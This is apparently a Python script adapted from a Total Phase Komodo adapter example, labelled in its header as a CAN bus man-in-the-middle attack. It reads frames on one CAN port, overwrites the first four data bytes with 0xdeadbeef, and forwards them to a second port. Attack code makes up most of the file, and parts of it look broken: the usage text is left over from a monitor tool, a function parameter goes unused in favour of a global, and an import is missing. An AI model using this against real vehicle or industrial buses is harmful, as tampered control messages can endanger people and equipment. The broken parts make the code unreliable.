#!/usr/bin/env python3
#==========================================================================
# (c) 2011-2019  Total Phase, Inc.
#--------------------------------------------------------------------------
# Project : Komodo Examples
# File    : monitor.py
#--------------------------------------------------------------------------
# Simple program that does CAN bus MITM attack.
#--------------------------------------------------------------------------
# Redistribution and use of this file in source and binary forms, with
# or without modification, are permitted.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
# "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
# LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS
# FOR A PARTICULAR PURPOSE ARE DISCLAIMED.  IN NO EVENT SHALL THE
# COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
# INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
# BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
# LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
# CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
# LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
# ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
# POSSIBILITY OF SUCH DAMAGE.
#========================================================================*/

#==========================================================================
# IMPORTS and CONSTANTS
#========================================================================*/
from __future__ import division, with_statement, print_function
from komodo_py import *

import sys

MAX_PKT_SIZE = 8
NUM_GPIOS    = 8


#=========================================================================
# FUNCTIONS
#=========================================================================
def print_usage ():
    print("""
Usage: monitor TARGET_PWR NUM_EVENTS

Example utility for capturing CAN and GPIO activity on CAN A.

  TARGET_PWR: 1 turns on target power, 0 does not
  NUM_EVENTS: Number of events to process before exiting.  If this is
              set to zero, the capture will continue indefinitely

For product documentation and specifications, see www.totalphase.com.
""")

def timestamp_to_ns (stamp, samplerate_khz):
    return (stamp * 1000 // (samplerate_khz // 1000))

def print_num_array (array, data_len):
    for i in range(data_len):
        print(array[i], end=' ')

def print_status (status):
    if status == KM_OK:                 print('OK', end=' ')
    if status & KM_READ_TIMEOUT:        print('TIMEOUT', end=' ')
    if status & KM_READ_ERR_OVERFLOW:   print('OVERFLOW', end=' ')
    if status & KM_READ_END_OF_CAPTURE: print('END OF CAPTURE', end=' ')
    if status & KM_READ_CAN_ARB_LOST:   print('ARBITRATION LOST', end=' ')
    if status & KM_READ_CAN_ERR:        print('ERROR %x' % (status &
                                                KM_READ_CAN_ERR_FULL_MASK), end=' ')

def print_events (events, bitrate):
    if events == 0:
        return
    if events & KM_EVENT_DIGITAL_INPUT:
        print('GPIO CHANGE 0x%x;' % (events & KM_EVENT_DIGITAL_INPUT_MASK), end=' ')
    if events & KM_EVENT_CAN_BUS_STATE_LISTEN_ONLY:
        print('BUS STATE LISTEN ONLY;', end=' ')
    if events & KM_EVENT_CAN_BUS_STATE_CONTROL:
        print('BUS STATE CONTROL;', end=' ')
    if events & KM_EVENT_CAN_BUS_STATE_WARNING:
        print('BUS STATE WARNING;', end=' ')
    if events & KM_EVENT_CAN_BUS_STATE_ACTIVE:
        print('BUS STATE ACTIVE;', end=' ')
    if events & KM_EVENT_CAN_BUS_STATE_PASSIVE:
        print('BUS STATE PASSIVE;', end=' ')
    if events & KM_EVENT_CAN_BUS_STATE_OFF:
        print('BUS STATE OFF;', end=' ')
    if events & KM_EVENT_CAN_BUS_BITRATE:
        print('BITRATE %d kHz;' % (bitrate // 1000), end=' ')

# The main packet dump routine
def can_proxy (km_a, km_b, max_events):
    info = km_can_info_t()
    pkt  = km_can_packet_t()
    data = array('B', [0]*MAX_PKT_SIZE)

    # Get samplerate
    samplerate_khz = km_get_samplerate(km) // 1000

    # Enable Komodo
    ret = km_enable(km)
    if ret != KM_OK:
        print('Unable to enable Komodo Port A')
        return
    ret = km_enable(km_b)
    if ret != KM_OK:
        print('Unable to enable Komodo Port B')
        return

    # Print description of csv output
    print()
    print('index,time(ns),(status & events),<ID:rtr/data> hex data')
    print()

    # Start monitoring
    count = 0
    while ((max_events == 0) or (count < max_events)):
        (ret, info, pkt, data) = km_can_read(km, data)

        print('%d,%d,(' % (count, timestamp_to_ns(info.timestamp,
                                                  samplerate_khz)), end=' ')
        if ret < 0:
            print('error=%d)' % ret)
            continue

        print_status(info.status)
        print_events(info.events, info.bitrate_hz)

        # Continue printing if we didn't see timeout, error or dataless events
        if ((info.status == KM_OK) and not info.events):
            print('),<%x:%s' % (pkt.id,
                                'rtr>' if pkt.remote_req else 'data>'), end=' ')

            # If packet contained data, print it
            if not pkt.remote_req:
                print_num_array(data, ret)
            
            # Modify data and send it to CAN B
            modified_data = data_modifier(data)
            ret, arbitration_count = km_can_write(km_b, KM_CAN_CH_B, 0, pkt, modified_data)
            if ret != KM_OK:
                print('Something went wrong writing to CAN B: ', ret)
                return
        else:
            print(')', end=' ')
        
        print()
        sys.stdout.flush()
        count += 1
# The function that does MITM attack
def data_modifier(data):
    # Modify data
    print('\nreplace data with:[deadbeef]')
    data[0] = 0xde
    data[1] = 0xad
    data[2] = 0xbe
    data[3] = 0xef
    return data

#==========================================================================
# MAIN PROGRAM
#==========================================================================
port    = 0      # Use port 0
port_b  = 1      # Use port 1
timeout = 1000   # ms
bitrate = 125000 # Hz

if len(sys.argv) < 3:
    print_usage()
    sys.exit(1)

power      = KM_TARGET_POWER_ON if int(sys.argv[1]) else KM_TARGET_POWER_OFF
max_events = int(sys.argv[2])

# Open the interface A and B
km = km_open(port)
km_b = km_open(port_b)
if km <= 0:
    print('Unable to open Komodo on port %d' % port)
    print('Error code = %d' % km)
    sys.exit(1)
if km_b <= 0:
    print('Unable to open Komodo on port %d' % port_b)
    print('Error code = %d' % km_b)
    sys.exit(1)

# Acquire features.  Acquiring KM_FEATURE_CAN_A_CONTROL causes the Komodo
# interface to ACK all packets transmitted on the bus.  Remove this feature to
# prevent the device from transmitting anything on the bus.
ret = km_acquire(km, KM_FEATURE_CAN_A_CONFIG  |
                     KM_FEATURE_CAN_A_LISTEN  |
                     KM_FEATURE_CAN_A_CONTROL |
                     KM_FEATURE_GPIO_CONFIG   |
                     KM_FEATURE_GPIO_LISTEN)
print('Acquired features 0x%x' % ret)

# Set bitrate
ret = km_can_bitrate(km, KM_CAN_CH_A, bitrate)
print('Bitrate set to %d kHz' % (ret // 1000))

# Set timeout
km_timeout(km, timeout)
print('Timeout set to %d ms' % timeout)

# Set target power
km_can_target_power(km, KM_CAN_CH_A, power)
print('Target power %s' % ('ON' if power else 'OFF'))

# Configure all GPIO pins as inputs
for i in range (NUM_GPIOS):
    km_gpio_config_in(km, i, KM_PIN_BIAS_PULLUP, KM_PIN_TRIGGER_BOTH_EDGES)
print('All pins set as inputs')

# Set up CAN B for writing 
reta = km_acquire(km_b, KM_FEATURE_CAN_B_CONFIG  |
                       KM_FEATURE_CAN_B_CONTROL) 
# Set bitrate for CAN B
ret = km_can_bitrate(km_b, KM_CAN_CH_B, bitrate)
# Set timeout for CAN B
km_timeout(km_b, timeout)
                   
can_proxy(km, km_b, max_events)
print()


# Close and exit
km_close(km)
sys.exit(0)
